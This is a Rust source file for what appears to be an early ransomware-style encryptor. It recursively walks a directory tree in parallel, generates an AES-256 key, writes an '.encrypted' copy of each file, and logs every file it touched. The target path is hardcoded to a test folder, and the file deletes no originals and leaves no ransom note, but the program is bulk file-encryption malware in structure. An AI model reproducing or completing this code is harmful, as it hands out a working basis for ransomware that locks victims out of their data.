#![allow(unused_mut)]
#![allow(dead_code)]
#![allow(unused_variables)]
use std::fs;
use std::env;
use std::io::Write;
use std::fs::File;
use std::path::PathBuf;
use std::fs::OpenOptions;
use rayon::prelude::*;
use aes256;


const MAX_DEPTH: u32 = 12;

#[derive(Debug)]
struct Node {
    path: PathBuf,
    depth: u32,
    files: Vec<String>,
    folders: Vec<Box<Node>>,
}

impl Node {
    pub fn new(path: PathBuf) -> Self {
        Node {
            path: path,
            depth: 0,
            files: Vec::new(),
            folders: Vec::new(),
        }
    }
    
    pub fn burrow(&mut self, key: &str) {
        let mut data = ls_dir(&self.path);
        
        self.files = data.par_iter()
            .filter(|x| x.is_file())
            .map(|y| y.as_path().display().to_string())
            .collect();
       
        let catch: Vec<u32> = data.par_iter()
            .filter(|x| x.is_file())
            .map(|y| {
                println!("{}", &y.to_str().unwrap());
                let path: &str = y.to_str().unwrap();
                let epath: &str = &(path.to_owned()+".encrypted");
                aes256::encrypt(path, epath, key); 
                0_u32
            }).collect();
            
        self.folders.par_extend(
            data.par_iter()
            .filter(|x| x.is_dir() && self.depth < MAX_DEPTH)
            .map(|y| {
                let mut new_node = Node::new((*y).to_path_buf());
                new_node.depth = self.depth+1;
                new_node.burrow(key);
                Box::new(new_node)
            }));
    } 
}

fn write_file_list(file_list: Vec<&String>, path: &str) {
    let mut new_file = OpenOptions::new()
        .write(true)
        .append(true)
        .open(path)
        .unwrap();
        
    for file in &file_list {
        if let Err(e) = writeln!(new_file, "{}", file) {
            eprintln!("Could not write to file: {}", e);
        }
    }
} 

fn get_file_list<'a>(node: &'a Node, file_list: &mut Vec<&'a String>) {
    file_list.extend(&node.files);
    file_list.to_vec();

    for n in &node.folders {
        get_file_list(&n, file_list);
    }
}

fn ls_dir(path: &PathBuf) -> Vec<PathBuf> {
    let mut contents: Vec<PathBuf> = Vec::new();
    let current_dir: fs::ReadDir = fs::read_dir(path).unwrap();

    for file in current_dir {
        contents.push(file.unwrap().path());
    }
    contents
}

fn main() {
    //let args: Vec<String> = env::args().collect();
    let root_path: PathBuf = PathBuf::from("/home/arbegla/test");//PathBuf::from(&args[1]);
    let mut node: Node = Node::new(root_path);
    
    let key_path: &str = "./key.txt";
    aes256::gen_key(key_path);

    node.burrow(key_path);

    let mut file_list: Vec<&String> = Vec::new();
    get_file_list(&node, &mut file_list); 
    
    let list_path: &str = "./files_touched.txt";
    let mut to_file: File = match File::create(list_path) {
        Ok(_file) => _file,
        Err(_e) => panic!("Error creating file {}", list_path),
    };
    
    write_file_list(file_list, list_path); 
}
